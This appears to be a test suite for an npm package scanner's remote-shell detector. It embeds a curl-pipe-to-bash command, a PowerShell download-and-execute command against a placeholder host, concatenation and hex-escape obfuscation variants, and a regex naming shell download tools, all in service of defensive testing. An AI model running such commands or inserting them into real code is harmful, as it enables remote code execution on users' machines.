import assert from 'node:assert/strict';
import { describe, it } from 'node:test';
import { findRemoteShellExecution } from '../src/scanner/content-remote-shell.js';
import { analyzePackageTarball } from '../src/scanner/package-content.js';
import { Severity } from '../src/scanner/types.js';
import { makeTarball } from './helpers/package-tarball.js';

const command = 'curl https://example.invalid/payload | bash';
const powershellCommand = 'Invoke-WebRequest https://example.invalid/payload | Invoke-Expression';
// A generic detector signature is data. Its curl/bash alternatives must not
// become evidence that the containing JavaScript executes a remote shell.
const signature = String.raw`const REMOTE_SHELL_PATTERN = /(?:\b(?:curl|wget)\b[^\r\n]{0,400}(?:\||&&|;)\s*(?:sudo\s+)?(?:sh|bash|zsh|powershell|pwsh|cmd)\b|(?:Invoke-WebRequest|DownloadString|WebClient)[^\r\n]{0,500}(?:Invoke-Expression|\biex\b|Start-Process))/i;`;
const module = `const cp = require('node:child_process');`;
const assess = (source: string, filePath = 'package/index.js') =>
  analyzePackageTarball(makeTarball([{ path: filePath, content: source }]));
const remoteFinding = (source: string) => assess(source).findings.find(finding => finding.ruleId === 'content-remote-shell');

describe('remote shell command execution context', () => {
  for (const [name, source] of [
    ['a detector regular-expression signature', signature],
    ['a line comment', `// ${command}\n${module}`],
    ['a block comment', `/* ${command} */\n${module}`],
    ['a documentation string', `${module}\nconst docs = ${JSON.stringify(command)};`],
    ['a log message', `${module}\nconsole.log(${JSON.stringify(command)});`],
    ['a regexp plus harmless process execution', `${signature}\n${module}\ncp.execSync('npm --version');`],
  ]) {
    it(`does not promote ${name} into remote execution`, () => {
      assert.equal(findRemoteShellExecution(source), undefined);
      assert.equal(remoteFinding(source), undefined);
    });
  }

  for (const [name, source] of [
    ['a direct CommonJS exec', `require('child_process').exec(${JSON.stringify(command)});`],
    ['a stable CommonJS module alias', `${module}\ncp.execSync(${JSON.stringify(command)});`],
    ['a destructured CommonJS alias', `const { exec: run } = require('node:child_process'); run(${JSON.stringify(command)});`],
    ['an ESM named alias', `import { execSync as run } from 'node:child_process'; run(${JSON.stringify(command)});`],
    ['an ESM namespace alias', `import * as cp from 'node:child_process'; cp.exec(${JSON.stringify(command)});`],
    ['a constant command alias', `${module}\nconst command = ${JSON.stringify(command)}; const alias = command; cp.exec(alias);`],
    ['a spawn shell argument', `${module}\ncp.spawn('sh', ['-c', ${JSON.stringify(command)}]);`],
    ['an execFileSync shell argument', `${module}\ncp.execFileSync('/bin/bash', ['-c', ${JSON.stringify(command)}]);`],
    ['a PowerShell command argument', `${module}\ncp.spawnSync('powershell.exe', ['-NoProfile', '-Command', ${JSON.stringify(powershellCommand)}]);`],
    ['spawn with an explicit shell option', `${module}\ncp.spawn(${JSON.stringify(command)}, [], { shell: true });`],
    ['spawn with a final shell option overriding an earlier false value', `${module}\ncp.spawn(${JSON.stringify(command)}, [], { shell: false, shell: true });`],
  ]) {
    it(`recognizes ${name}`, () => {
      const signal = findRemoteShellExecution(source);
      assert.ok(signal && signal.end > signal.start);
      const finding = remoteFinding(source);
      assert.ok(finding);
      assert.equal(finding.severity, Severity.Critical);
      assert.equal(finding.filePath, 'package/index.js');
    });
  }

  it('recognizes folded module, method and command literals using original evidence', () => {
    const source = `require('chi'+'ld_process')['ex'+'ec']('cu'+'rl https://example.invalid/payload | ba'+'sh');`;
    const signal = findRemoteShellExecution(source);
    assert.ok(signal);
    assert.match(source.slice(signal.start, signal.end), /'cu'\+'rl/);
    assert.equal(remoteFinding(source)?.severity, Severity.Critical);
  });

  it('recognizes escaped static module, method and command strings', () => {
    const source = String.raw`require('ch\x69ld_process')['ex\x65c']('c\x75rl https://example.invalid/payload | b\x61sh');`;
    assert.ok(findRemoteShellExecution(source));
    assert.equal(remoteFinding(source)?.severity, Severity.Critical);
  });

  it('continues past a harmless detector signature to a real later execution', () => {
    const source = `${signature}\n${module}\ncp.exec(${JSON.stringify(command)});`;
    const signal = findRemoteShellExecution(source);
    assert.ok(signal);
    assert.ok(signal.start > signature.length);
    const finding = remoteFinding(source);
    assert.equal(finding?.severity, Severity.Critical);
    assert.equal(finding?.lineNumber, 3);
  });

  for (const [name, source] of [
    ['an unrelated exec method', `const cp = console; cp.exec(${JSON.stringify(command)});`],
    ['a shadowed require parameter', `function sample(require) { require('child_process').exec(${JSON.stringify(command)}); }`],
    ['a shadowed module parameter', `${module}\nfunction sample(cp) { cp.exec(${JSON.stringify(command)}); }`],
    ['a shadowed ESM alias parameter', `import { exec as run } from 'node:child_process'; function sample(run) { run(${JSON.stringify(command)}); }`],
    ['a module alias shadowed by an expression arrow parameter', `${module}\nconst sample = cp => cp.exec(${JSON.stringify(command)});`],
    ['a process-method alias shadowed by an expression arrow parameter', `const { exec: run } = require('child_process'); const sample = (run) => run(${JSON.stringify(command)});`],
    ['a command alias shadowed by an expression arrow parameter', `${module}\nconst command = ${JSON.stringify(command)}; const sample = command => cp.exec(command);`],
    ['a reassigned module', `let cp = require('child_process'); cp = console; cp.exec(${JSON.stringify(command)});`],
    ['a module reassigned inside a nested block', `let cp = require('child_process'); { cp = console; } cp.exec(${JSON.stringify(command)});`],
    ['a command reassigned inside a nested block', `${module}\nlet command = ${JSON.stringify(command)}; { command = 'echo safe'; } cp.exec(command);`],
    ['a replaced process method', `${module}\ncp.exec = console.log; cp.exec(${JSON.stringify(command)});`],
    ['a replaced computed process method', `${module}\ncp['exec'] = console.log; cp.exec(${JSON.stringify(command)});`],
    ['a replaced folded computed process method', `${module}\ncp['ex'+'ec'] = console.log; cp.exec(${JSON.stringify(command)});`],
    ['a reassigned process alias', `let { exec: run } = require('child_process'); run = console.log; run(${JSON.stringify(command)});`],
  ]) {
    it(`does not connect ${name} to remote execution`, () => {
      assert.equal(findRemoteShellExecution(source), undefined);
      assert.equal(remoteFinding(source), undefined);
    });
  }

  it('does not treat a dangerous-looking argv data argument as a shell command', () => {
    const source = `${module}\ncp.execFileSync('printf', ['%s', ${JSON.stringify(command)}]);`;
    assert.equal(findRemoteShellExecution(source), undefined);
    assert.equal(remoteFinding(source), undefined);
  });

  it('does not execute an unused function definition when resolving an outer command alias', () => {
    const safe = `${module}\nlet command = 'npm --version'; function unused() { command = ${JSON.stringify(command)}; } cp.exec(command);`;
    assert.equal(findRemoteShellExecution(safe), undefined);
    const dangerous = `${module}\nlet command = ${JSON.stringify(command)}; function unused() { command = 'npm --version'; } cp.exec(command);`;
    assert.ok(findRemoteShellExecution(dangerous));
    assert.equal(remoteFinding(dangerous)?.severity, Severity.Critical);
  });

  for (const [name, options] of [
    ['an explicit disabled shell', '{ shell: false }'],
    ['a default direct process launch', "{ stdio: 'inherit' }"],
    ['a later disabled shell override', '{ shell: true, shell: false }'],
    ['an unknown later spread override', '{ shell: true, ...options }'],
  ]) {
    it(`does not treat spawn with ${name} as a shell command`, () => {
      const source = `${module}\ncp.spawn(${JSON.stringify(command)}, [], ${options});`;
      assert.equal(findRemoteShellExecution(source), undefined);
      assert.equal(remoteFinding(source), undefined);
    });
  }

  it('retains remote-shell detection for actual shell script files', () => {
    const result = assess(`#!/bin/sh\n${command}\n`, 'package/scripts/install.sh');
    const finding = result.findings.find(finding => finding.ruleId === 'content-remote-shell');
    assert.equal(finding?.severity, Severity.Critical);
    assert.equal(finding?.lineNumber, 2);
  });

  it('retains a medium capability finding for ordinary diagnostic subprocesses', () => {
    const source = `import { execFileSync } from 'node:child_process';
      execFileSync('where', ['npm.cmd'], {encoding:'utf8'});
      execFileSync('npm', ['prefix', '-g'], {encoding:'utf8'});`;
    const findings = assess(source, 'package/dist/cli/doctor.js').findings;
    assert.ok(findings.some(finding => finding.ruleId === 'content-process-exec' && finding.severity === Severity.Medium));
    assert.ok(!findings.some(finding => finding.ruleId === 'content-remote-shell'));
  });
});

describe('remote shell function and argument boundaries', () => {
  it('keeps object property writes separate from command bindings in both directions', () => {
    const safe = `${module}\nconst command = 'echo safe'; const other = {}; other.command = ${JSON.stringify(command)}; cp.exec(command);`;
    assert.equal(findRemoteShellExecution(safe), undefined);
    assert.equal(remoteFinding(safe), undefined);
    const dangerous = `${module}\nconst command = ${JSON.stringify(command)}; const other = {}; other.command = 'echo safe'; cp.exec(command);`;
    assert.ok(findRemoteShellExecution(dangerous));
    assert.equal(remoteFinding(dangerous)?.severity, Severity.Critical);
  });

  it('isolates unused expression-arrow writes from outer command bindings in both directions', () => {
    const safe = `${module}\nlet command = 'echo safe'; const unused = () => command = ${JSON.stringify(command)}; cp.exec(command);`;
    assert.equal(findRemoteShellExecution(safe), undefined);
    assert.equal(remoteFinding(safe), undefined);
    const dangerous = `${module}\nlet command = ${JSON.stringify(command)}; const unused = () => command = 'echo safe'; cp.exec(command);`;
    assert.ok(findRemoteShellExecution(dangerous));
    assert.equal(remoteFinding(dangerous)?.severity, Severity.Critical);
  });

  it('still inspects process calls and local command writes inside expression arrows', () => {
    assert.ok(findRemoteShellExecution(`${module}\nconst sample = () => cp.exec(${JSON.stringify(command)});`));
    assert.ok(findRemoteShellExecution(`${module}\nlet command = 'echo safe'; const sample = () => (command = ${JSON.stringify(command)}, cp.exec(command));`));
    assert.equal(findRemoteShellExecution(`${module}\nlet command = 'echo safe'; const outer = () => (inner => command = ${JSON.stringify(command)}); cp.exec(command);`), undefined);
  });

  for (const overwrite of ['cp = console;', 'cp.exec = console.log;', "cp['exec'] = console.log;"]) {
    it(`does not execute an unused function's ${overwrite}`, () => {
      const source = `${module}\nfunction unused() { ${overwrite} } cp.exec(${JSON.stringify(command)});`;
      assert.ok(findRemoteShellExecution(source));
      assert.equal(remoteFinding(source)?.severity, Severity.Critical);
    });
  }

  for (const local of [
    `if (true) { var command = 'echo safe'; } cp.exec(command);`,
    `cp.exec(command); if (true) { var command = 'echo safe'; }`,
    `if (true) { var cp = {exec: console.log}; } cp.exec(command);`,
    `cp.exec(command); if (true) { var cp = {exec: console.log}; }`,
  ]) {
    it(`honors function-scoped var declarations in ${local}`, () => {
      const source = `${module}\nconst command = ${JSON.stringify(command)}; function sample() { ${local} }`;
      assert.equal(findRemoteShellExecution(source), undefined);
      assert.equal(remoteFinding(source), undefined);
    });
  }

  for (const [name, call] of [
    ['a static computed shell option', `cp.spawn(${JSON.stringify(command)}, [], {['shell']: true});`],
    ['an unrelated static computed option', `cp.spawn(${JSON.stringify(command)}, [], {shell: true, ['stdio']: 'inherit'});`],
    ['shell-interpreted literal argv', `cp.spawn('curl', ['https://example.invalid/payload | bash'], {shell: true});`],
  ]) {
    it(`retains ${name}`, () => {
      assert.equal(remoteFinding(`${module}\n${call}`)?.severity, Severity.Critical);
    });
  }

  for (const call of [
    `cp.spawn('powershell.exe', ['-File', 'report.ps1', '-Command', ${JSON.stringify(powershellCommand)}]);`,
    `cp.spawn('pwsh', ['--file', 'report.ps1', '-Command', ${JSON.stringify(powershellCommand)}]);`,
    `cp.spawn('sh', ['report.sh', '-c', ${JSON.stringify(command)}]);`,
    `cp.spawn('bash', ['--', 'report.sh', '-c', ${JSON.stringify(command)}]);`,
  ]) {
    it(`does not interpret script-file arguments in ${call}`, () => {
      assert.equal(findRemoteShellExecution(`${module}\n${call}`), undefined);
      assert.equal(remoteFinding(`${module}\n${call}`), undefined);
    });
  }
});
